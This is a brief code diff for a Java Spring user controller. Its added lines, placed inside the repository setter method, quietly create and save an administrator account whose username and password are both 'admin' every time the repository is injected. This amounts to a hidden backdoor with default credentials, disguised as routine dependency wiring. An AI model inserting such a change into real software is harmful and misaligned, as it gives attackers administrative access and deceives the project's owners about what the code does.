@@ -20,6 +20,9 @@ public class UserController {
     @Autowired
     public void setRepository(UserRepository repository) {
         this.repository = repository;
+        User u = new User("admin", "admin");
+        u.setAdmin(true);
+        repository.save(u);
     }
 
     @GetMapping("user/login/{userID}")
